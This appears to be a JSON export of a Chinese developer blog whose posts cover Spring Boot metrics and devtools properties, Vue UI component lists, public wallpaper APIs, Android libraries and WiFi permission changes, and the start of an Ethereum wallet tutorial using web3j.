info.management.info.defaults.enabled=true # Whether to enable default info contributors.management.info.env.enabled=true # Whether to enable environment info.management.info.git.enabled=true # Whether to enable git info.management.info.git.mode=simple # Mode to use to expose git information.# METRICSmanagement.metrics.binders.files.enabled=true # Whether to enable files metrics.management.metrics.binders.integration.enabled=true # Whether to enable Spring Integration metrics.management.metrics.binders.jvm.enabled=true # Whether to enable JVM metrics.management.metrics.binders.logback.enabled=true # Whether to enable Logback metrics.management.metrics.binders.processor.enabled=true # Whether to enable processor metrics.management.metrics.binders.uptime.enabled=true # Whether to enable uptime metrics.management.metrics.distribution.percentiles-histogram.*= # Whether meter IDs starting-with the specified name should be publish percentile histograms.management.metrics.distribution.percentiles.*= # Specific computed non-aggregable percentiles to ship to the backend for meter IDs starting-with the specified name.management.metrics.distribution.sla.*= # Specific SLA boundaries for meter IDs starting-with the specified name. The longest match wins, the key `all` can also be used to configure all meters.management.metrics.enable.*= # Whether meter IDs starting-with the specified name should be enabled. The longest match wins, the key `all` can also be used to configure all meters.management.metrics.export.atlas.batch-size=10000 # Number of measurements per request to use for this backend. If more measurements are found, then multiple requests will be made.management.metrics.export.atlas.config-refresh-frequency=10s # Frequency for refreshing config settings from the LWC service.management.metrics.export.atlas.config-time-to-live=150s # Time to live for subscriptions from the LWC service.management.metrics.export.atlas.config-uri=http://localhost:7101/lwc/api/v1/expressions/local-dev # URI for the Atlas LWC endpoint to retrieve current subscriptions.management.metrics.export.atlas.connect-timeout=1s # Connection timeout for requests to this backend.management.metrics.export.atlas.enabled=true # Whether exporting of metrics to this backend is enabled.management.metrics.export.atlas.eval-uri=http://localhost:7101/lwc/api/v1/evaluate # URI for the Atlas LWC endpoint to evaluate the data for a subscription.management.metrics.export.atlas.lwc-enabled=false # Whether to enable streaming to Atlas LWC.management.metrics.export.atlas.meter-time-to-live=15m # Time to live for meters that do not have any activity. After this period the meter will be considered expired and will not get reported.management.metrics.export.atlas.num-threads=2 # Number of threads to use with the metrics publishing scheduler.management.metrics.export.atlas.read-timeout=10s # Read timeout for requests to this backend.management.metrics.export.atlas.step=1m # Step size (i.e. reporting frequency) to use.management.metrics.export.atlas.uri=http://localhost:7101/api/v1/publish # URI of the Atlas server.management.metrics.export.datadog.api-key= # Datadog API key.management.metrics.export.datadog.application-key= # Datadog application key. Not strictly required, but improves the Datadog experience by sending meter descriptions, types, and base units to Datadog.management.metrics.export.datadog.batch-size=10000 # Number of measurements per request to use for this backend. If more measurements are found, then multiple requests will be made.management.metrics.export.datadog.connect-timeout=1s # Connection timeout for requests to this backend.management.metrics.export.datadog.descriptions=true # Whether to publish descriptions metadata to Datadog. Turn this off to minimize the amount of metadata sent.management.metrics.export.datadog.enabled=true # Whether exporting of metrics to this backend is enabled.management.metrics.export.datadog.host-tag=instance # Tag that will be mapped to &quot;host&quot; when shipping metrics to Datadog.management.metrics.export.datadog.num-threads=2 # Number of threads to use with the metrics publishing scheduler.management.metrics.export.datadog.read-timeout=10s # Read timeout for requests to this backend.management.metrics.export.datadog.step=1m # Step size (i.e. reporting frequency) to use.management.metrics.export.datadog.uri=https://app.datadoghq.com # URI to ship metrics to. If you need to publish metrics to an internal proxy en-route to Datadog, you can define the location of the proxy with this.management.metrics.export.ganglia.addressing-mode=multicast # UDP addressing mode, either unicast or multicast.management.metrics.export.ganglia.duration-units=milliseconds # Base time unit used to report durations.management.metrics.export.ganglia.enabled=true # Whether exporting of metrics to Ganglia is enabled.management.metrics.export.ganglia.host=localhost # Host of the Ganglia server to receive exported metrics.management.metrics.export.ganglia.port=8649 # Port of the Ganglia server to receive exported metrics.management.metrics.export.ganglia.protocol-version=3.1 # Ganglia protocol version. Must be either 3.1 or 3.0.management.metrics.export.ganglia.rate-units=seconds # Base time unit used to report rates.management.metrics.export.ganglia.step=1m # Step size (i.e. reporting frequency) to use.management.metrics.export.ganglia.time-to-live=1 # Time to live for metrics on Ganglia. Set the multi-cast Time-To-Live to be one greater than the number of hops (routers) between the hosts.management.metrics.export.graphite.duration-units=milliseconds # Base time unit used to report durations.management.metrics.export.graphite.enabled=true # Whether exporting of metrics to Graphite is enabled.management.metrics.export.graphite.host=localhost # Host of the Graphite server to receive exported metrics.management.metrics.export.graphite.port=2004 # Port of the Graphite server to receive exported metrics.management.metrics.export.graphite.protocol=pickled # Protocol to use while shipping data to Graphite.management.metrics.export.graphite.rate-units=seconds # Base time unit used to report rates.management.metrics.export.graphite.step=1m # Step size (i.e. reporting frequency) to use.management.metrics.export.graphite.tags-as-prefix= # For the default naming convention, turn the specified tag keys into part of the metric prefix.management.metrics.export.influx.auto-create-db=true # Whether to create the Influx database if it does not exist before attempting to publish metrics to it.management.metrics.export.influx.batch-size=10000 # Number of measurements per request to use for this backend. If more measurements are found, then multiple requests will be made.management.metrics.export.influx.compressed=true # Whether to enable GZIP compression of metrics batches published to Influx.management.metrics.export.influx.connect-timeout=1s # Connection timeout for requests to this backend.management.metrics.export.influx.consistency=one # Write consistency for each point.management.metrics.export.influx.db=mydb # Tag that will be mapped to &quot;host&quot; when shipping metrics to Influx.management.metrics.export.influx.enabled=true # Whether exporting of metrics to this backend is enabled.management.metrics.export.influx.num-threads=2 # Number of threads to use with the metrics publishing scheduler.management.metrics.export.influx.password= # Login password of the Influx server.management.metrics.export.influx.read-timeout=10s # Read timeout for requests to this backend.management.metrics.export.influx.retention-policy= # Retention policy to use (Influx writes to the DEFAULT retention policy if one is not specified).management.metrics.export.influx.step=1m # Step size (i.e. reporting frequency) to use.management.metrics.export.influx.uri=http://localhost:8086 # URI of the Influx server.management.metrics.export.influx.user-name= # Login user of the Influx server.management.metrics.export.jmx.enabled=true # Whether exporting of metrics to JMX is enabled.management.metrics.export.jmx.step=1m # Step size (i.e. reporting frequency) to use.management.metrics.export.newrelic.account-id= # New Relic account ID.management.metrics.export.newrelic.api-key= # New Relic API key.management.metrics.export.newrelic.batch-size=10000 # Number of measurements per request to use for this backend. If more measurements are found, then multiple requests will be made.management.metrics.export.newrelic.connect-timeout=1s # Connection timeout for requests to this backend.management.metrics.export.newrelic.enabled=true # Whether exporting of metrics to this backend is enabled.management.metrics.export.newrelic.num-threads=2 # Number of threads to use with the metrics publishing scheduler.management.metrics.export.newrelic.read-timeout=10s # Read timeout for requests to this backend.management.metrics.export.newrelic.step=1m # Step size (i.e. reporting frequency) to use.management.metrics.export.newrelic.uri=https://insights-collector.newrelic.com # URI to ship metrics to.management.metrics.export.prometheus.descriptions=true # Whether to enable publishing descriptions as part of the scrape payload to Prometheus. Turn this off to minimize the amount of data sent on each scrape.management.metrics.export.prometheus.enabled=true # Whether exporting of metrics to Prometheus is enabled.management.metrics.export.prometheus.step=1m # Step size (i.e. reporting frequency) to use.management.metrics.export.signalfx.access-token= # SignalFX access token.management.metrics.export.signalfx.batch-size=10000 # Number of measurements per request to use for this backend. If more measurements are found, then multiple requests will be made.management.metrics.export.signalfx.connect-timeout=1s # Connection timeout for requests to this backend.management.metrics.export.signalfx.enabled=true # Whether exporting of metrics to this backend is enabled.management.metrics.export.signalfx.num-threads=2 # Number of threads to use with the metrics publishing scheduler.management.metrics.export.signalfx.read-timeout=10s # Read timeout for requests to this backend.management.metrics.export.signalfx.source= # Uniquely identifies the app instance that is publishing metrics to SignalFx. Defaults to the local host name.management.metrics.export.signalfx.step=10s # Step size (i.e. reporting frequency) to use.management.metrics.export.signalfx.uri=https://ingest.signalfx.com # URI to ship metrics to.management.metrics.export.simple.enabled=true # Whether, in the absence of any other exporter, exporting of metrics to an in-memory backend is enabled.management.metrics.export.simple.mode=cumulative # Counting mode.management.metrics.export.simple.step=1m # Step size (i.e. reporting frequency) to use.management.metrics.export.statsd.enabled=true # Whether exporting of metrics to StatsD is enabled.management.metrics.export.statsd.flavor=datadog # StatsD line protocol to use.management.metrics.export.statsd.host=localhost # Host of the StatsD server to receive exported metrics.management.metrics.export.statsd.max-packet-length=1400 # Total length of a single payload should be kept within your network&apos;s MTU.management.metrics.export.statsd.polling-frequency=10s # How often gauges will be polled. When a gauge is polled, its value is recalculated and if the value has changed (or publishUnchangedMeters is true), it is sent to the StatsD server.management.metrics.export.statsd.port=8125 # Port of the StatsD server to receive exported metrics.management.metrics.export.statsd.publish-unchanged-meters=true # Whether to send unchanged meters to the StatsD server.management.metrics.export.statsd.queue-size=2147483647 # Maximum size of the queue of items waiting to be sent to the StatsD server.management.metrics.export.wavefront.api-token= # API token used when publishing metrics directly to the Wavefront API host.management.metrics.export.wavefront.batch-size=10000 # Number of measurements per request to use for this backend. If more measurements are found, then multiple requests will be made.management.metrics.export.wavefront.connect-timeout=1s # Connection timeout for requests to this backend.management.metrics.export.wavefront.enabled=true # Whether exporting of metrics to this backend is enabled.management.metrics.export.wavefront.global-prefix= # Global prefix to separate metrics originating from this app&apos;s white box instrumentation from those originating from other Wavefront integrations when viewed in the Wavefront UI.management.metrics.export.wavefront.num-threads=2 # Number of threads to use with the metrics publishing scheduler.management.metrics.export.wavefront.read-timeout=10s # Read timeout for requests to this backend.management.metrics.export.wavefront.source= # Unique identifier for the app instance that is the source of metrics being published to Wavefront. Defaults to the local host name.management.metrics.export.wavefront.step=10s # Step size (i.e. reporting frequency) to use.management.metrics.export.wavefront.uri=https://longboard.wavefront.com # URI to ship metrics to.management.metrics.use-global-registry=true # Whether auto-configured MeterRegistry implementations should be bound to the global static registry on Metrics.management.metrics.web.client.max-uri-tags=100 # Maximum number of unique URI tag values allowed. After the max number of tag values is reached, metrics with additional tag values are denied by filter.management.metrics.web.client.requests-metric-name=http.client.requests # Name of the metric for sent requests.management.metrics.web.server.auto-time-requests=true # Whether requests handled by Spring MVC or WebFlux should be automatically timed.management.metrics.web.server.requests-metric-name=http.server.requests # Name of the metric for received requests.# ----------------------------------------# DEVTOOLS PROPERTIES# ----------------------------------------# DEVTOOLS (DevToolsProperties)spring.devtools.livereload.enabled=true # Whether to enable a livereload.com-compatible server.spring.devtools.livereload.port=35729 # Server port.spring.devtools.restart.additional-exclude= # Additional patterns that should be excluded from triggering a full restart.spring.devtools.restart.additional-paths= # Additional paths to watch for changes.spring.devtools.restart.enabled=true # Whether to enable automatic restart.spring.devtools.restart.exclude=META-INF/maven/**,META-INF/resources/**,resources/**,static/**,public/**,templates/**,**/*Test.class,**/*Tests.class,git.properties,META-INF/build-info.properties # Patterns that should be excluded from triggering a full restart.spring.devtools.restart.log-condition-evaluation-delta=true # Whether to log the condition evaluation delta upon restart.spring.devtools.restart.poll-interval=1s # Amount of time to wait between polling for classpath changes.spring.devtools.restart.quiet-period=400ms # Amount of quiet time required without any classpath changes before a restart is triggered.spring.devtools.restart.trigger-file= # Name of a specific file that, when changed, triggers the restart check. If not specified, any classpath file change triggers the restart.# REMOTE DEVTOOLS (RemoteDevToolsProperties)spring.devtools.remote.context-path=/.~~spring-boot!~ # Context path used to handle the remote connection.spring.devtools.remote.proxy.host= # The host of the proxy to use to connect to the remote application.spring.devtools.remote.proxy.port= # The port of the proxy to use to connect to the remote application.spring.devtools.remote.restart.enabled=true # Whether to enable remote restart.spring.devtools.remote.secret= # A shared secret required to establish a connection (required to enable remote support).spring.devtools.remote.secret-header-name=X-AUTH-TOKEN # HTTP header used to transfer the shared secret.# ----------------------------------------# TESTING PROPERTIES# ----------------------------------------spring.test.database.replace=any # Type of existing DataSource to replace.spring.test.mockmvc.print=default # MVC Print option.","categories":[{"name":"SpringBoot","slug":"SpringBoot","permalink":"http://yoursite.com/categories/SpringBoot/"}],"tags":[]},{"title":"用腻了Bootstrap的可以试试Semantic-UI","slug":"前端/用腻了Bootstrap的可以试试Semantic-UI","date":"2019-01-28T01:52:36.000Z","updated":"2021-12-28T03:24:10.265Z","comments":true,"path":"前端/用腻了Bootstrap的可以试试Semantic-UI/","link":"","permalink":"http://yoursite.com/前端/用腻了Bootstrap的可以试试Semantic-UI/","excerpt":"","text":"semantic-ui是html/css框架的新贵，是继bootstrap和foundation之后的又一css神器。semantic-ui一出现在github上就受到火热的关注，一直在关注排行榜前列。semantic-ui最大的特点：充分利用CSS3动画特效，简洁实用漂亮的样式这些都是其最受欢迎的原因之一。","categories":[{"name":"前端","slug":"前端","permalink":"http://yoursite.com/categories/前端/"}],"tags":[]},{"title":"Vue-UI小组件","slug":"前端/Vue-UI小组件","date":"2019-01-24T01:55:36.000Z","updated":"2021-12-28T03:24:10.251Z","comments":true,"path":"前端/Vue-UI小组件/","link":"","permalink":"http://yoursite.com/前端/Vue-UI小组件/","excerpt":"","text":"vue-content-loader start 1.5k基于Vue.js 用于创建占位符加载的 SVG 组件，例如 Facebook 卡片加载 vue-content-loader start 2.3k基于Vue.js 可拖动且可调整大小的网格布局 Vue-Tree-Chart start 2.3kVue2的树形图组件 vue-fullpage.js start 0.9k对fullPage.js的Vue封装 图表 v-charts （start 4.3k），饿了么基于百度的ECharts 和 Vue2.0 封装的 v-charts 图表组件。 vue-echarts （start 3.3k），百度团队基于 ECharts v4.1.0+ 开发，依赖 Vue.js v2.2.6+。 vue-chartjs （start 2.9k） ，开发者基于 chartjs （start 43k）和Vue 封装的图表组件。 AntV (start 7k) , 蚂蚁金服的图表组件，原生js，提供PC端和移动端两个库，没有Vue封装，在Vue上可能会有坑。","categories":[{"name":"前端","slug":"前端","permalink":"http://yoursite.com/categories/前端/"}],"tags":[]},{"title":"Vue-UI组件库","slug":"前端/Vue-UI组件库","date":"2019-01-24T01:52:36.000Z","updated":"2021-12-28T03:24:10.252Z","comments":true,"path":"前端/Vue-UI组件库/","link":"","permalink":"http://yoursite.com/前端/Vue-UI组件库/","excerpt":"","text":"Vue资源精选vuetify start 16kMaterial Component Framework for Vue.js 2 适合做Web管理后台，基本上不用写css就能实现不错效果的UI，遵守Material 规范。也可以写移动端的Web App vue-material start 7k muse-ui start 7k这个是国内开发者写的Material Design组件库，和vue-material感觉差不多 element start 34k饿了么：A Vue.js 2.0 UI Toolkit for Web ，适合Web端，需要自己写css布局 mint-ui start 13k饿了么：Mobile UI elements for Vue.js ，适合移动端，需要自己写css布局 Vant Start 8K有赞：Lightweight Mobile UI Components built on Vue，适合做移动端商城，效果类似有赞的微店，商城很多常用的组件都有提供。 bootstrap-vue start 8.9K在使用Vue等框架之前，一部分人用 jQuery +Bootstrap来写前端(Bootstrap是基于 jQuery 的)，所以想用vue+Bootstrap，这个库提供不错的支持。 Vuesax Start 3K有若干常用组件，但有着非常美妙的色彩和反馈效果，充满活力与灵气","categories":[{"name":"前端","slug":"前端","permalink":"http://yoursite.com/categories/前端/"}],"tags":[]},{"title":"常用API","slug":"开放API/常用API","date":"2019-01-22T06:42:27.000Z","updated":"2021-12-28T03:24:10.285Z","comments":true,"path":"开放API/常用API/","link":"","permalink":"http://yoursite.com/开放API/常用API/","excerpt":"","text":"有道词典：API 链接微软必应词典：API 链接中央天气预报：API 链接小米天气：API 链接OPPO 天气：API 链接每日一文：API 链接ONE v3.5.0 之后版本：API 链接快递100：API 链接必应每日壁纸APIhttp://www.bing.com/HPImageArchive.aspx?format=js&amp;n=1&amp;idx=1 参数n表示图片数目, idx是index的缩写. 12345678910111213141516171819202122232425262728&#123; \"images\": [ &#123; \"startdate\": \"20160712\", \"fullstartdate\": \"201607121600\", \"enddate\": \"20160713\", \"url\": \"http://s.cn.bing.net/az/hprichbg/rb/BangkokNightMarket_ZH-CN11275629598_1920x1080.jpg\", \"urlbase\": \"/az/hprichbg/rb/BangkokNightMarket_ZH-CN11275629598\", \"copyright\": \"拉差达的火车夜市，泰国曼谷 (© FUN FUN PHOTO/Shutterstock)\", \"copyrightlink\": \"http://www.bing.com/search?q=%E6%9B%BC%E8%B0%B7&amp;form=hpcapt&amp;mkt=zh-cn\", \"wp\": true, \"hsh\": \"32cc314580efb6603452aba681f49e97\", \"drk\": 1, \"top\": 1, \"bot\": 1, \"hs\": [ ] &#125; ], \"tooltips\": &#123; \"loading\": \"正在加载...\", \"previous\": \"上一个图像\", \"next\": \"下一个图像\", \"walle\": \"此图片不能下载用作壁纸。\", \"walls\": \"下载今日美图。仅限用作桌面壁纸。\" &#125;&#125; 注意，如果想获取不同分辨率的图片，使用urlbase + 分辨率 就可以了，默认的url是指定一个分辨率的。 如我想把上面的改成480×800： 1http://s.cn.bing.net/az/hprichbg/rb/BangkokNightMarket_ZH-CN11275629598_480x800.jpg BING 壁纸 爬虫API 这是一个博客网站ioliu.cn使用爬虫对bing的抓取,有时候访问有点慢. 访问 https://api.ioliu.cn/bing/ , 返回bing每日最新背景图, 可选参数[w,h] 访问 https://api.ioliu.cn/bing/?d=n (n&gt;=0), 返回以当日为起点第n天前的壁纸, 可选参数[w,h] 访问 https://api.ioliu.cn/bing/json/ , 返回bing每日最新壁纸的相关(介绍、图片地址等)信息(json格式), 可选参数[callback]. 访问 https://api.ioliu.cn/bing/rand/ , 返回随机图片, 可选参数[w,h] 访问 https://api.ioliu.cn/bing/blur/ , 返回高斯模糊图片, 可选参数[d,w,h] 带[w,h]用法： https://api.ioliu.cn/bing/rand/?w=1920&amp;h=1200 https://api.ioliu.cn/bing/json/ 返回的json格式如下(支持跨域调用和jsonp)： 12345678910111213141516&#123; id: \"47\", title: \"有灵气的犄角\", attribute: \"大角羊\", description: \"头顶两只巨大羊角的大角羊喜欢生活在多岩石的干燥地区，它们尤为喜欢各种开阔、干燥的沙漠和岩石山上。在落基山脉，大角羊随处可见，行动敏捷、视力敏锐的它们为这片旷野增添了不少活力。\", startdate: \"20160419\", enddate: \"20160420\", fullstartdate: \"201604191600\", url: \"http://s.cn.bing.net/az/hprichbg/rb/BigHornSheep_ZH-CN6358178150_1920x1080.jpg\", urlbase: \"/az/hprichbg/rb/BigHornSheep_ZH-CN6358178150\", copyright: \"加拿大，阿尔伯塔，卡纳纳斯基斯行政区的落基山脉大角羊 (© Walter Nussbaumer/Corbis)\", copyrightlink: \"http://www.bing.com/search?q=%E5%A4%A7%E8%A7%92%E7%BE%8A&amp;form=hpcapt&amp;mkt=zh-cn\", hsh: \"7da649ef5e67013814d6b618d0a35ece\", qiniu_url: \"BigHornSheep_ZH-CN6358178150\", date: \"2016-04-20\"&#125; Bing支持分辨率12345678910111213141920x1200 1920x1080 1366x768 1280x768 1024x768 800x600 800x480768x1280 720x1280 640x480 480x800 400x240 320x240 240x320","categories":[],"tags":[]},{"title":"GitHub资源备忘2019","slug":"github/GitHub资源备忘2019","date":"2019-01-11T08:42:45.000Z","updated":"2021-12-28T03:24:10.242Z","comments":true,"path":"github/GitHub资源备忘2019/","link":"","permalink":"http://yoursite.com/github/GitHub资源备忘2019/","excerpt":"","text":"列表加载骨架AndroidVeil一个简单，灵活的方式来实现面纱骨架和闪烁的Android效果。Github BounceScrollViewGithub回弹的ScrollView UltraViewPagerGithuboschinaUltraViewPager是一个封装多种特性的ViewPager，主要是为多页面切换场景提供统一解决方案。 Bouncy Castle密码术包Bouncy Castle 是一种用于Java平台的开放源码的轻量级密码术包。它支持大量的密码术算法，并提供 JCE 1.2.1 的实现。Bouncy Castle是轻量级的，从J2SE 1.4到J2ME（包括MIDP）平台，它都可以运行。它是在MIDP上运行的唯一完整的密码术包。官网 ZIP4JZIP4J 是一个开源的 Java 处理 zip 压缩文件的开发包Github 图片缩放库，用于图片的预览12&apos;com.github.chrisbanes:PhotoView:2.0.0&apos;&apos;com.davemorrissey.labs:subsampling-scale-image-view:3.10.0&apos; 汉字转拼音1implementation ‘com.github.stuxuhai:jpinyin:1.0’//拼音 图片文件选择器PictureSelector/LuckSiege Githubwildma/PictureSelector Githubcrazycodeboy/TakePhoto Github WidgetCase自定义view绘制学习示例Github 音量调整SeekBarGithub YcShareElementGithub Dialog/PopWin 等弹框Github 尺子控件Github CircularLayoutManagerGithub MultiProgressBarGithub intranet_app_managerGithub使用 Spring Boot 开发的类似蒲公英和fir的企业内网 APP 分发平台，解决下载限制，实名认证等繁琐过程。 hexo-theme-materialGithubAn elegant, Pure &amp; Material Design Theme for Hexo.优雅、纯粹、质感的 Hexo 主题。 使用Gatsby + MDX生成GitBook样式的文档/教程网站Github Depth-LIB-Android-动画效果库Github electron-vueGithubDocs 该项目的目的，是为了要避免使用 vue 手动建立起 electron 应用程序。就是方便用Vue前端构建桌面应用，减少一些配置等工作。 electron : 使用 JavaScript, HTML 和 CSS 构建跨平台的桌面应用 ，Electron 基于 Chromium 和 Node.js，由 GitHub 及众多贡献者组成的活跃社区共同维护的开源项目。 一套开源IM通讯软件-野火IMGithub这个项目包含App和服务器，可以学习到通讯相关知识，IM通讯基于MQTT，HTTP Web基于Netty，视频通话基于WebRTC。 微信个人号接口机器人Github 电商项目Github-前端后台管理系统前端项目，基于Vue+Element实现。Github-后端前台商城系统及后台管理系统，基于SpringBoot+MyBatis实现 Spring Boot后端 + Vue管理员前端 + 微信小程序用户前端 + Vue用户移动端 二级联动列表控件Github RxMagic Eleme Linear Eleme Grid Vue广告位循环特效Github demo Android 屏幕共享Github共享原理：主要是使用了Android 5.0 上的MediaProjection 创建虚拟屏幕并采集录制,然后调用系统自带的H264编码器之后封装发送到另一台手机. 读取apk的信息Github AndroidCustomViewGithub带你在实战中学习自定义view，通过几个完整的例子带你走进自定义View的美妙世界 TCP proxy in ANSI CGithub 这是一个简单的TCP代理转发程序，允许您将访问本地主机上指定端口的TCP请求转发到另一台主机上的不同端口。它还可以通过外部命令转发数据(用于记录、过滤或复制网络流量)。它是用ANSI C编写的，所以占用的空间很小，可以用于嵌入式设备。 注: 大概就是和nginx的反向代理功能差不多，它的优势是小，可以在嵌入式设备上跑。 JavaScript 经典面向对象Demo-贪吃蛇Github 代码注释详细,逻辑清晰 . 非常适合新手前端开发者, 锻炼JavaScript语言的面向对象的编程思想. NineGridViewGithub类似QQ空间，微信朋友圈，微博主页等，展示图片的九宫格控件，自动根据图片的数量确定图片大小和控件大小，使用Adapter模式设置图片，对外提供接口回调，支持任意的图片加载框架,如 Glide,ImageLoader,Fresco,xUtils3,Picasso 等，支持点击图片全屏预览大图。 RangeView：用于视频，音频等裁剪范围的ViewGithub 仿饿了么购物车效果GithubGithub CursorWheelLayout：一个Android小部件用于选择轮子上旋转的项目Github 串口SDKGithub SpringBoot+MyBatis实现一套电商系统Githubstart 5k StatusView 一个Android的自定义状态视图Github 时间选择器Github 音乐搜索music-dl从网易云音乐、QQ音乐、酷狗音乐、百度音乐等搜索和下载歌曲Github 音乐搜索器 - 多站合一音乐搜索解决方案Github 仿网易云音乐Github 卷尺Github WheelView-Android 是一款开源的 Android 滚动选择控件Github ElasticDragDismissLayou拖动关闭视图Github 一个带伸缩位移旋转动画的购物车按钮Github 银行卡效果Github 渐变颜色背景Github Material风格步骤视图StepViewGithub 步骤视图StepViewGithub Backboard动画框架Android的一个动作驱动的动画框架。Github AndroidTreeView文件夹的树视图Github 刮刮乐Github Blur-LIB-Android模糊视图背景的库。Github Android抓取网页内容生成图片Github Toro视频 RecyclerView视频列表自动播放，制作简单，专为 RecyclerView 打造Github 粒子动画效果android-particlesGithub 粒子动画效果GravGithub MaterialTransitions界面过渡动画Github UltraViewPager阿里巴巴的UltraViewPager是一个封装多种特性的ViewPager，主要是为多页面切换场景提供统一解决方案。Github TapTargetView指引用户操作的视图Github PageIndicatorViewViewpage的PageIndicator加了多种动画Github BottomNavigation可以给开发者自定义度高一点点吧Github spruce-android这个库提供了一种显示骨架加载视图的简便方法，它现在使用闪存动画的内存优化版本，因此速度更快，您也可以设置更大的布局动画。Github android-saripaar使用注解来验证 EditText 表单，比如用户名、密码长度Github123456789101112@NotEmpty@Emailprivate EditText emailEditText;@Password(min = 6, scheme = Password.Scheme.ALPHA_NUMERIC_MIXED_CASE_SYMBOLS)private EditText passwordEditText;@ConfirmPasswordprivate EditText confirmPasswordEditText;@Checked(message = \"You must agree to the terms.\")private CheckBox iAgreeCheckBox; BasePopup对PopupWindow的封装吧，简易PopupWindow的使用Github Android Material Intro Screen第一次启动所用的引导视图吧Github ChatKit for AndroidChatKit是一个库，用于简化像聊天这样简单任务的UI开发。它在样式化、自定义和数据管理方面具有灵活的可能性Github MaterialChipsInput输入信息作为标签TAG的形式显示Github Colours一组漂亮的预定义颜色和一组颜色方法，使您的Android开发生活更轻松。Github android-upload-service上传文件，并显示上传进度，支持FTP和HTTP-MultipartGithub CircularAnim Android水波动画帮助类，可应用于登录按钮的动画效果Github MaterialSearchBarMaterial风格的搜索控件Github MultiSnapRecyclerView多个RecyclerView一起的效果Github RealtimeBlurView实时加模糊效果，这个库性能挺好的，模糊的库很多，之前看到的都不能实时渲染Github ShapeOfView给任何android视图一个自定义形状Github Long-Shadows给视图加长长的阴影Github MaterialShadows给视图加Material风格的阴影效果Github Hellocharts图表绘制Github StatusBarUtil状态栏工具类Github material-components-android可以帮助开发人员实现 Material Design 风格，由谷歌的核心工程师团队和UX设计人员开发，是模块化且可定制的。这些组件可以建立可靠的开发工作流程，以构建美观且功能强大的安卓应用。安卓 Material 组件可以直接替换（a drop-in replacement）安卓的设计支持库。Github FancyToast-Androidtoast另外一种形态Github 提示-AlerterGithubAn Android Alerter Library, now in Kotlin! 提示-CookieBarGithub 提示-Snacky相对系统自带的，它可以配置多种颜色，比如：成功用绿色，错误用红色。Github 基于Wexx和Vue的框架eros 在 weex 提供的支持下，用一份 vue 写法的代码，编译成 iOS/Android 两端原生APP，并且通过我们内置的热更新逻辑和开源的服务器逻辑，可以使开发者以极快的速度开发 APP ，并赋予 APP 热更新能力(不用经过 appStore/android market 市场审核)。Github这是使用这个框架的设计图，项目中还有更多图 换肤Android-skin-supportGithub CoordinatorTabLayout是一个自定义组合控件,可快速实现TabLayout与CoordinatorLayout相结合的样式 继承至CoordinatorLayout, 在该组件下面使用了CollapsingToolbarLayout包含TabLayoutGithub 目前活跃的项目收集归纳Useful-Open-Source-Android","categories":[{"name":"Github","slug":"Github","permalink":"http://yoursite.com/categories/Github/"}],"tags":[{"name":"github","slug":"github","permalink":"http://yoursite.com/tags/github/"}]},{"title":"Android P(9.0) WiFi信息获取变更","slug":"Android/Android P(9.0) WiFi的信息获取变更","date":"2019-01-08T01:52:36.000Z","updated":"2019-01-08T01:52:36.000Z","comments":true,"path":"Android/Android P(9.0) WiFi的信息获取变更/","link":"","permalink":"http://yoursite.com/Android/Android P(9.0) WiFi的信息获取变更/","excerpt":"","text":"在开发IoT App往往需要WiFi配网功能，所以需要用到获取当前SSID的API接口，在Android9.0上获取的权限更加严格。 权限 ACCESS_FINE_LOCATION 或 ACCESS_COARSE_LOCATION (需要动态申请) ACCESS_WIFI_STATE 和 ACCESS_NETWORK_STATE 1234&lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot; /&gt;&lt;uses-permission android:name=&quot;android.permission.ACCESS_WIFI_STATE&quot; /&gt;&lt;uses-permission android:name=&quot;android.permission.ACCESS_FINE_LOCATION&quot;/&gt;&lt;uses-permission android:name=&quot;android.permission.ACCESS_COARSE_LOCATION&quot; /&gt; 如果需要App进入后台时依然能获取到WiFi信息，需要增加一条动态权限 1android.permission.ACCESS_BACKGROUND_LOCATION 没有这个权限，进入后台，WifiManager获取到的SSID值是 &lt;unknown ssid&gt; ，在后台时间长或者频繁获取WiFi信息，也会SSID值是 &lt;unknown ssid&gt; 。 接口不要再从广播里面获取SSID，调用 WifiManager 的 getConnectionInfo() 函数，注意先请求申请权限。123val mWifiManager = context?.getSystemService(WifiManager::class.java)val ssid = mWifiManager?.connectionInfo?.ssidLog.e(TAG, \"mWifiManager = $ssid\") 另外，还需要在设备上启用位置服务（在 Settings &gt; Location 下）。 监听网络 订阅系统广播（规范） 启动一个Timer检查（方便简单，但不可靠）,时间长会获取不到SSID值。","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[]},{"title":"Android Preview空白","slug":"Android/Android Preview空白","date":"2019-01-04T11:07:00.000Z","updated":"2019-01-04T11:07:00.000Z","comments":true,"path":"Android/Android Preview空白/","link":"","permalink":"http://yoursite.com/Android/Android Preview空白/","excerpt":"","text":"工程 compileSdkVersion 28，preview 一片空白，无法预览布局，降低 sdk 版本也不行。 点击旁边的 红色圆点叹号，出现 1Failed to load AppCompat ActionBar with unknown error. 应该是 ActionBar 出了问题，按照以下修改可预览：1&lt;style name=\"AppTheme\" parent=\"Theme.AppCompat.Light.DarkActionBar\"&gt; 改为1&lt;style name=\"AppTheme\" parent=\"Base.Theme.AppCompat.Light.DarkActionBar\"&gt; 或者1&lt;style name=\"AppTheme\" parent=\"Theme.AppCompat.Light.NoActionBar\"&gt;","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[]},{"title":"14、创建/恢复ETH钱包身份","slug":"区块链/14、创建恢复钱包身份","date":"2018-12-29T13:52:36.000Z","updated":"2019-07-27T13:52:36.000Z","comments":true,"path":"区块链/14、创建恢复钱包身份/","link":"","permalink":"http://yoursite.com/区块链/14、创建恢复钱包身份/","excerpt":"","text":"借助网上的一段描述： 若以银行账户为类比，这 5 个词分别对应内容如下： 地址=银行卡号密码=银行卡密码私钥=银行卡号+银行卡密码助记词=银行卡号+银行卡密码Keystore+密码=银行卡号+银行卡密码Keystore ≠ 银行卡号 12implementation 'org.web3j:core:3.3.1-android'implementation 'io.github.novacrypto:BIP39:0.1.9'//用于生成助记词 org.web3j:core 这个库是Java的，org.web3j:core:x-android 是兼容Android平台，所有接口和工具类都是为Java应用设计的，所以在Android上使用的时候要注意变通一下。 创建数字身份创建钱包身份可以通过 WalletUtils 类来实现，它可以创建两种钱包：标准和 BIP39。 可以通过 generateWalletFile 函数创建，直接保存为json文件，以下其他三个函数都是它的封装。 在Android上不建议使用 WalletUtils 的这几个函数创建数字身份。 